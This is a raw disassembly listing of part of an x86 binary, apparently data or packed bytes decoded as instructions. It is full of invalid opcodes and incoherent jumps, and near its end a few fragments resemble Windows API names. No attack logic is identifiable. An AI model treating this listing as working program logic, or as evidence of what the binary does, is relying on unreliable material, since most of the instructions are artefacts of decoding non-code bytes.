  41fb8e:	bound  edi,QWORD PTR [ecx-0x1b]
  41fb91:	js     0x41fb3d
  41fb93:	cld    
  41fb94:	jnp    0x41fbd7
  41fb96:	aad    0x9a
  41fb98:	sub    BYTE PTR [ebx],al
  41fb9a:	cmp    al,0xa4
  41fb9c:	mov    ds:0x585c82f,eax
  41fba1:	mov    DWORD PTR [esi+ecx*2+0x53],eax
  41fba5:	aam    0xd1
  41fba7:	je     0x41fb33
  41fba9:	or     esp,esp
  41fbab:	das    
  41fbac:	ja     0x41fb5e
  41fbae:	stc    
  41fbaf:	cmc    
  41fbb0:	loop   0x41fbba
  41fbb2:	dec    edi
  41fbb3:	adc    BYTE PTR [ecx+esi*1+0xd184c10],cl
  41fbba:	loopne 0x41fbfe
  41fbbc:	mov    DWORD PTR [eax-0x11dd23d3],ebx
  41fbc2:	cmp    al,0x2f
  41fbc4:	mov    dh,0xbe
  41fbc6:	mov    BYTE PTR [esi],bl
  41fbc8:	pop    edx
  41fbc9:	add    al,0x89
  41fbcb:	and    al,BYTE PTR ds:0xd3ec7079
  41fbd1:	add    bh,BYTE PTR [ebx-0x18]
  41fbd4:	fsub   DWORD PTR [edi-0x26]
  41fbd7:	xchg   edi,eax
  41fbd8:	outs   dx,DWORD PTR ds:[esi]
  41fbd9:	adc    ebx,DWORD PTR [ecx-0x487fd7c3]
  41fbdf:	sub    al,0xcf
  41fbe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbe2:	loopne 0x41fc29
  41fbe4:	mov    dh,BYTE PTR [edx+0x2c]
  41fbe7:	sub    eax,0x6c467011
  41fbec:	shl    DWORD PTR [edi-0x28],cl
  41fbef:	iret   
  41fbf0:	inc    edi
  41fbf1:	sub    ebx,DWORD PTR ds:0xcf86ba30
  41fbf7:	fbld   TBYTE PTR [esi-0x75]
  41fbfa:	ret    0x3ab
  41fbfd:	icebp  
  41fbfe:	repnz in al,dx
  41fc00:	aam    0xa0
  41fc02:	fld    QWORD PTR [ecx-0x25e2a247]
  41fc08:	cmp    eax,0xdbef3447
  41fc0d:	sub    edx,DWORD PTR [ebp-0x40b7035b]
  41fc13:	jae    0x41fc0f
  41fc15:	jg     0x41fbf7
  41fc17:	dec    edx
  41fc18:	jge    0x41fbba
  41fc1a:	cmp    al,0x0
  41fc1c:	mov    cl,0x0
	...
  41fc2a:	add    cl,bh
  41fc2c:	sbb    al,al
  41fc2e:	inc    esi
  41fc2f:	jecxz  0x41fc0f
  41fc31:	(bad)  
  41fc32:	mov    edi,0xe1f1bc83
  41fc37:	xchg   ah,cl
  41fc39:	adc    al,0xf0
  41fc3b:	aaa    
  41fc3c:	test   al,0x1
  41fc3e:	add    BYTE PTR [edx+0x0],ch
  41fc44:	or     BYTE PTR [edi],bh
  41fc46:	rcl    ecx,1
  41fc48:	mov    esi,0x45638da8
  41fc4d:	xchg   ebx,eax
  41fc4e:	repz mov gs,WORD PTR [esi-0x73f04ec1]
  41fc55:	xlat   BYTE PTR ds:[ebx]
  41fc56:	xchg   ebp,eax
  41fc57:	daa    
  41fc58:	adc    ecx,DWORD PTR [ebp-0x5126f25c]
  41fc5e:	mov    ah,0xae
  41fc60:	dec    ecx
  41fc61:	je     0x41fc89
  41fc63:	mov    dl,0xe3
  41fc65:	xor    BYTE PTR [esi-0x79616b22],dl
  41fc6b:	xor    cl,ch
  41fc6d:	mov    eax,ds:0x70a696ce
  41fc72:	push   ebx
  41fc74:	paddusw mm3,QWORD PTR [edx]
  41fc77:	pusha  
  41fc78:	inc    edx
  41fc79:	test   eax,0x7c6d2a21
  41fc7e:	sbb    cl,dh
  41fc80:	push   edx
  41fc81:	(bad)  
  41fc82:	mov    dl,0x33
  41fc84:	jae    0x41fc23
  41fc86:	dec    edx
  41fc87:	jge    0x41fcd1
  41fc89:	push   esi
  41fc8a:	into   
  41fc8b:	dec    esi
  41fc8c:	daa    
  41fc8d:	jno    0x41fcac
  41fc8f:	sub    BYTE PTR [ebp+0x5c],0x24
  41fc93:	xchg   BYTE PTR [ecx+0x7b],cl
  41fc96:	adc    DWORD PTR [eax-0x299dce5f],esp
  41fc9c:	sub    al,0xca
  41fc9e:	jb     0x41fc96
  41fca0:	mov    dl,0x52
  41fca2:	aad    0x73
  41fca4:	shl    BYTE PTR [ebx],0xad
  41fca7:	sbb    eax,ebx
  41fca9:	jb     0x41fd20
  41fcab:	outs   dx,DWORD PTR ds:[esi]
  41fcac:	adc    ah,al
  41fcae:	push   eax
  41fcaf:	push   0x21
  41fcb1:	ss aaa 
  41fcb3:	sbb    al,0xe0
  41fcb5:	js     0x41fcf5
  41fcb7:	xchg   ebx,eax
  41fcb8:	add    ah,BYTE PTR [ebp-0x20475f19]
  41fcbe:	fsubr  DWORD PTR [ebx+0x38]
  41fcc1:	xchg   edx,eax
  41fcc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcc3:	mov    al,ds:0x5ddf9b11
  41fcc8:	xor    DWORD PTR [ebx-0x67],0x36ae720a
  41fccf:	fisttp QWORD PTR [esi-0x2057a422]
  41fcd5:	out    0x4b,eax
  41fcd7:	icebp  
  41fcd8:	pop    ebp
  41fcd9:	dec    esi
  41fcda:	inc    ecx
  41fcdb:	push   edi
  41fcdc:	mov    ah,0x1
  41fcde:	retf   
  41fcdf:	(bad)  
  41fce0:	out    dx,al
  41fce1:	xor    ebp,DWORD PTR [edx+ecx*2]
  41fce4:	cli    
  41fce5:	push   ecx
  41fce6:	xor    BYTE PTR [edi+0x31225e49],bl
  41fcec:	jb     0x41fcee
	...
  41fcfa:	add    BYTE PTR [ecx+0x3e8336b9],ah
  41fd00:	(bad)  
  41fd01:	mov    ch,0xbb
  41fd03:	icebp  
  41fd04:	and    eax,0x43d18c27
  41fd09:	push   esi
  41fd0a:	fucom  st(1)
  41fd0c:	test   al,0x1
  41fd0e:	add    BYTE PTR [edx-0x70000000],ch
  41fd14:	push   cs
  41fd15:	in     al,dx
  41fd16:	loope  0x41fcff
  41fd18:	push   ss
  41fd19:	(bad)  
  41fd1a:	mov    al,0xa4
  41fd1c:	xchg   edx,eax
  41fd1d:	lods   eax,DWORD PTR ds:[esi]
  41fd1e:	jns    0x41fd0a
  41fd20:	in     eax,dx
  41fd21:	or     dl,BYTE PTR [edi+0x1892eea8]
  41fd27:	cli    
  41fd28:	cli    
  41fd29:	nop
  41fd2a:	push   cs
  41fd2b:	cld    
  41fd2c:	jns    0x41fd49
  41fd2e:	and    al,0x71
  41fd30:	loope  0x41fcda
  41fd32:	jbe    0x41fcd9
  41fd34:	inc    edx
  41fd35:	or     al,0x1e
  41fd37:	add    BYTE PTR [esi+0x24],cl
  41fd3a:	inc    ecx
  41fd3b:	jns    0x41fd45
  41fd3d:	or     BYTE PTR [esi+0x1654414c],0x5a
  41fd44:	or     BYTE PTR [esi+eax*1],bh
  41fd47:	dec    ebp
  41fd48:	dec    esi
  41fd49:	aad    0x70
  41fd4b:	adc    edi,eax
  41fd4d:	jbe    0x41fd5b
  41fd4f:	loop   0x41fd99
  41fd51:	js     0x41fd13
  41fd53:	dec    eax
  41fd54:	leave  
  41fd55:	push   0x7148ac67
  41fd5a:	enter  0xe9d8,0x77
  41fd5e:	rcl    BYTE PTR [esi-0x66],0xa0
  41fd62:	mov    esi,0xb102d5db
  41fd67:	outs   dx,DWORD PTR ds:[esi]
  41fd68:	or     ecx,DWORD PTR [esi+0x2d39c233]
  41fd6e:	into   
  41fd6f:	sbb    ecx,ecx
  41fd71:	adc    al,BYTE PTR [ebp-0x79]
  41fd74:	fadd   DWORD PTR [ebx-0x4a]
  41fd77:	div    DWORD PTR ss:[ebp-0x66]
  41fd7b:	enter  0xa699,0x9f
  41fd7f:	lock fiadd WORD PTR [esi-0x59ae6d08]
  41fd86:	push   ecx
  41fd87:	mov    esi,0xf7fea79e
  41fd8c:	or     eax,0x271c355d
  41fd91:	cmp    DWORD PTR [eax+0x1a],esi
  41fd94:	adc    BYTE PTR [ebp+0x271e087a],dh
  41fd9a:	jmp    0x41fdd7
  41fd9c:	gs or  eax,0xeb1cbed4
  41fda2:	xlat   BYTE PTR ds:[ebx]
  41fda3:	sbb    eax,0xef09cd8d
  41fda8:	push   edi
  41fda9:	mov    ah,0x0
  41fdab:	fldpi  
  41fdad:	adc    ebp,DWORD PTR [eax+0x310521f9]
  41fdb3:	cmp    dh,BYTE PTR [ecx-0x4e]
  41fdb6:	daa    
  41fdb7:	pop    eax
  41fdb8:	test   BYTE PTR [edi+0x5a],al
  41fdbb:	add    esp,DWORD PTR [esi+0x0]
	...
  41fdca:	add    BYTE PTR [edx],dl
  41fdcc:	xlat   BYTE PTR ds:[ebx]
  41fdcd:	repz or esi,edi
  41fdd0:	das    
  41fdd1:	cli    
  41fdd2:	fist   WORD PTR [ecx]
  41fdd4:	dec    ebx
  41fdd5:	es nop
  41fdd7:	outs   dx,DWORD PTR ds:[esi]
  41fdd8:	les    ecx,FWORD PTR [ecx+0x1a98bb0]
  41fdde:	add    BYTE PTR [edx+0x17000000],ch
  41fde4:	xchg   esp,eax
  41fde5:	sub    esp,DWORD PTR [ebx+0x66]
  41fde8:	jp     0x41fe26
  41fdea:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41fdec:	mov    edi,0x8d9c2bb7
  41fdf1:	mov    bl,0x97
  41fdf3:	pop    edi
  41fdf4:	stc    
  41fdf5:	popf   
  41fdf6:	cmc    
  41fdf7:	in     al,dx
  41fdf8:	mov    ebp,0xa4bd4054
  41fdfd:	les    ebx,FWORD PTR [ecx+ecx*2-0x3c]
  41fe01:	jmp    FWORD PTR [edi+0x3d]
  41fe04:	mov    esp,0xb276d881
  41fe09:	xchg   ecx,eax
  41fe0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe0b:	mov    DWORD PTR ds:[ecx-0xa581c36],edx
  41fe12:	lds    esp,FWORD PTR [ebp+0x45]
  41fe15:	icebp  
  41fe16:	mov    eax,ds:0x489432a3
  41fe1b:	loopne 0x41fdd9
  41fe1d:	sub    BYTE PTR [edi+eax*4],0x0
  41fe21:	imul   eax,DWORD PTR [ecx+0x50],0xd607fceb
  41fe28:	mov    eax,ds:0x907851aa
  41fe2d:	emms   
  41fe2f:	bnd jno 0x41feb1
  41fe32:	cdq    
  41fe33:	inc    DWORD PTR [ebp+0x1b9f98c3]
  41fe39:	dec    esi
  41fe3a:	xchg   edx,eax
  41fe3b:	fstp   TBYTE PTR [edx]
  41fe3d:	pop    esi
  41fe3e:	cs retf 0x69db
  41fe42:	xor    BYTE PTR [ecx-0x3dd2bf02],0x4e
  41fe49:	adc    DWORD PTR [edx+eiz*4-0x13],0x6c
  41fe4e:	mov    ds:0xe11d8b46,eax
  41fe53:	push   esi
  41fe54:	je     0x41fe51
  41fe56:	or     bh,BYTE PTR [ecx-0x51bee1ef]
  41fe5c:	sbb    BYTE PTR [edi],bl
  41fe5e:	in     al,0x8e
  41fe60:	call   0x5f08:0xbdb43230
  41fe67:	or     bl,cl
  41fe69:	sub    ebp,DWORD PTR [esi+edi*1-0x6fee2064]
  41fe70:	retf   0x5468
  41fe73:	sub    BYTE PTR [ebp-0x29],dh
  41fe76:	or     dh,dh
  41fe78:	js     0x41fe0f
  41fe7a:	pop    es
  41fe7b:	sbb    al,0xb5
  41fe7e:	or     eax,0x7f1714a2
  41fe83:	test   DWORD PTR [esi+0x7d],ebp
  41fe86:	sub    eax,0x96ba4b50
  41fe8b:	adc    BYTE PTR [ecx+0x0],ch
	...
  41fe99:	add    BYTE PTR [eax],al
  41fe9b:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41fea1:	inc    edx
  41fea2:	add    BYTE PTR [eax],cl
  41fea4:	nop
  41fea5:	inc    edx
  41fea6:	add    BYTE PTR [eax+edx*4],cl
  41fea9:	inc    edx
  41feaa:	add    BYTE PTR [eax],dl
  41feac:	nop
  41fead:	inc    edx
  41feae:	add    BYTE PTR [eax+edx*4],dl
  41feb1:	inc    edx
  41feb2:	add    BYTE PTR [eax],bl
  41feb4:	nop
  41feb5:	inc    edx
  41feb6:	add    BYTE PTR [eax+edx*4],bl
  41feb9:	inc    edx
  41feba:	add    BYTE PTR [esi+0x49],cl
  41febd:	dec    esi
  41febe:	pop    edi
  41febf:	pop    edx
  41fec0:	dec    edx
  41fec1:	inc    ecx
  41fec2:	xor    eax,DWORD PTR [eax]
  41fec4:	push   ebx
  41fec5:	push   edi
  41fec6:	inc    edi
  41fec7:	cmp    DWORD PTR [edi+0x41],ebx
  41feca:	pop    eax
  41fecb:	ss push esi
  41fecd:	pop    ecx
  41fece:	add    BYTE PTR [ebx+0x43],dl
  41fed1:	inc    ebp
  41fed2:	pop    edi
  41fed3:	inc    ecx
  41fed4:	pop    eax
  41fed5:	push   edi
  41fed6:	dec    eax
  41fed7:	inc    edx
  41fed8:	pop    edi
  41fed9:	cmp    DWORD PTR [ecx+0x4d],ecx
  41fedc:	dec    ecx
  41fedd:	add    BYTE PTR [ecx+0x46],al
  41fee0:	cmp    DWORD PTR [edx],esi
  41fee2:	xor    ebx,DWORD PTR [edi+0x32]
  41fee5:	aaa    
  41fee6:	inc    esp
  41fee7:	inc    esp
  41fee8:	pop    edi
  41fee9:	xor    eax,0x41545800
  41feee:	pop    edi
  41feef:	push   ecx
  41fef0:	push   esp
  41fef1:	inc    esi
  41fef2:	push   ebp
  41fef3:	cmp    DWORD PTR [eax],eax
  41fef5:	push   edi
  41fef6:	push   ebp
  41fef7:	inc    ecx
  41fef8:	xor    dh,BYTE PTR [ebx]
  41fefa:	xor    ebx,DWORD PTR [edi+0x4e]
  41fefd:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff01:	cmp    DWORD PTR [edi+0x38],ebx
  41ff04:	dec    ecx
  41ff05:	cmp    DWORD PTR [edx+0x36],ebx
  41ff08:	pop    edi
  41ff09:	dec    edx
  41ff0a:	xor    BYTE PTR [edx+0x34],cl
  41ff0d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff11:	xor    esi,DWORD PTR [eax]
  41ff13:	pop    edi
  41ff14:	inc    edx
  41ff15:	dec    ebx
  41ff16:	pop    eax
  41ff17:	pop    eax
  41ff18:	xor    eax,0x51414d00
  41ff1d:	pop    edi
  41ff1e:	inc    ecx
  41ff1f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff22:	inc    ecx
  41ff23:	dec    ebx
  41ff24:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff2a:	inc    ebp
  41ff2b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff2e:	ss dec eax
  41ff30:	dec    ebx
  41ff31:	add    BYTE PTR [ebp+0x57],al
  41ff34:	xor    DWORD PTR [edi+0x31],ebx
  41ff37:	dec    ebx
  41ff38:	xor    eax,DWORD PTR [ecx+0x30]
  41ff3b:	push   ebx
  41ff3c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff40:	aaa    
  41ff41:	pop    edi
  41ff42:	push   edx
  41ff43:	dec    eax
  41ff44:	dec    ebp
  41ff45:	cmp    BYTE PTR [edi+0x37],bl
  41ff48:	inc    esi
  41ff49:	xor    eax,0x35005500
  41ff4e:	add    BYTE PTR [ebx+0x0],al
  41ff51:	pop    edi
  41ff52:	add    BYTE PTR [ecx+0x0],bl
  41ff55:	dec    ecx
  41ff56:	add    BYTE PTR [ebx+0x0],dl
  41ff59:	xor    al,BYTE PTR [eax]
  41ff5b:	pop    edi
  41ff5c:	add    BYTE PTR [edx+0x0],dl
  41ff5f:	add    BYTE PTR [eax],al
  41ff61:	push   eax
  41ff62:	add    BYTE PTR [ebp+0x0],dl
  41ff65:	dec    ecx
  41ff66:	add    BYTE PTR [eax],dh
  41ff68:	add    BYTE PTR [edi+0x0],bl
  41ff6b:	inc    ebx
  41ff6c:	add    BYTE PTR [esi],dh
  41ff6e:	add    BYTE PTR [ebp+0x0],al
  41ff71:	xor    al,BYTE PTR [eax]
  41ff73:	pop    edi
  41ff74:	add    BYTE PTR [ebp+0x0],cl
  41ff77:	xor    al,0x0
  41ff79:	dec    edx
  41ff7a:	add    BYTE PTR [edx+0x0],dl
  41ff7d:	push   ebp
  41ff7e:	add    BYTE PTR [eax],al
  41ff80:	add    BYTE PTR [esi+0x0],cl
  41ff83:	cmp    DWORD PTR [eax],eax
  41ff85:	push   eax
  41ff86:	add    BYTE PTR [edi+0x0],bl
  41ff89:	push   ebp
  41ff8a:	add    BYTE PTR [ecx],bh
  41ff8c:	add    BYTE PTR [esi],dh
  41ff8e:	add    BYTE PTR [eax],dh
  41ff90:	add    BYTE PTR [ecx],dh
  41ff92:	add    BYTE PTR [edi+0x0],bl
  41ff95:	dec    edi
  41ff96:	add    BYTE PTR [esi+0x0],cl
  41ff99:	push   esp
  41ff9a:	add    BYTE PTR [eax],bh
  41ff9c:	add    BYTE PTR [eax],al
  41ff9e:	add    BYTE PTR [eax+eax*1+0x34],cl
  41ffa2:	add    BYTE PTR [eax+eax*1+0x31],al
  41ffa6:	add    BYTE PTR [edi+0x0],bl
  41ffa9:	dec    ebx
  41ffaa:	add    BYTE PTR [ecx],dh
  41ffac:	add    BYTE PTR [ebp+0x0],al
  41ffaf:	pop    edi
  41ffb0:	add    BYTE PTR [edx+0x0],bl
  41ffb3:	add    BYTE PTR [eax],al
  41ffb5:	push   esp
  41ffb6:	add    BYTE PTR [edi],dh
  41ffb8:	add    BYTE PTR [ebx+0x0],al
  41ffbb:	pop    edi
  41ffbc:	add    BYTE PTR [edx+0x0],al
  41ffbf:	xor    al,BYTE PTR [eax]
  41ffc1:	xor    DWORD PTR [eax],eax
  41ffc3:	push   ebx
  41ffc4:	add    BYTE PTR [ecx],dh
  41ffc6:	add    BYTE PTR [ecx],bh
  41ffc8:	add    BYTE PTR [edx+0x0],al
  41ffcb:	add    BYTE PTR [eax],al
  41ffcd:	inc    edi
  41ffce:	add    BYTE PTR [ebp+0x0],al
  41ffd1:	xor    al,0x0
  41ffd3:	cmp    BYTE PTR [eax],al
  41ffd5:	add    BYTE PTR [eax],al
  41ffd7:	add    BYTE PTR [eax+0x42],dl
  41ffda:	add    BYTE PTR [eax+edx*2],al
  41ffdd:	inc    edx
  41ffde:	add    BYTE PTR [eax],cl
  41ffe0:	push   eax
  41ffe1:	inc    edx
  41ffe2:	add    BYTE PTR [eax+edx*2],cl
  41ffe5:	inc    edx
  41ffe6:	add    BYTE PTR [eax],dl
  41ffe8:	push   eax
  41ffe9:	inc    edx
  41ffea:	add    BYTE PTR [eax+edx*2],dl
  41ffed:	inc    edx
  41ffee:	add    BYTE PTR [eax],bl
  41fff0:	push   eax
  41fff1:	inc    edx
  41fff2:	add    BYTE PTR [eax+edx*2],bl
  41fff5:	inc    edx
  41fff6:	add    BYTE PTR [eax],ah
  41fff8:	push   eax
  41fff9:	inc    edx
  41fffa:	add    BYTE PTR [eax+edx*2],ah
  41fffd:	inc    edx
  41fffe:	add    BYTE PTR [eax],ch
  420000:	push   eax
  420001:	inc    edx
	...
  420012:	add    BYTE PTR [eax],al
  420014:	call   0x0:0x4d3ef2
  42001b:	add    BYTE PTR [edx+0x0],al
  42001e:	add    al,BYTE PTR [eax]
  420020:	add    DWORD PTR [eax],eax
  420022:	add    BYTE PTR [eax],al
  420024:	add    DWORD PTR [eax],eax
  420026:	add    BYTE PTR [eax],al
  420028:	add    DWORD PTR [eax],eax
  42002a:	add    BYTE PTR [eax],al
  42002c:	cmp    BYTE PTR [eax],al
  42002e:	add    al,BYTE PTR [eax]
  420030:	cmp    al,0x0
  420032:	add    al,BYTE PTR [eax]
  420034:	inc    eax
  420035:	add    BYTE PTR [edx],al
  420037:	add    ah,bl
  420039:	cmp    al,0x0
  42003b:	add    BYTE PTR [esi+0x0],cl
  42003e:	add    al,BYTE PTR [eax]
  420040:	add    BYTE PTR [eax],al
  420042:	push   edi
  420043:	outs   dx,DWORD PTR ds:[esi]
  420044:	jb     0x4200aa
  420046:	push   edi
  420047:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42004e:	aas    
  42004f:	inc    ebx
  420050:	ins    BYTE PTR es:[edi],dx
  420051:	outs   dx,DWORD PTR ds:[esi]
  420052:	jae    0x4200b9
  420054:	push   edi
  420055:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42005c:	popa   
  42005d:	je     0x4200c8
  42005f:	outs   dx,DWORD PTR ds:[esi]
  420060:	outs   dx,BYTE PTR ds:[esi]
  420061:	inc    ebx
  420062:	ins    BYTE PTR es:[edi],dx
  420063:	outs   dx,DWORD PTR ds:[esi]
  420064:	jae    0x4200cb
  420066:	push   edi
  420067:	imul   eax,DWORD PTR [eax],0x0
	...
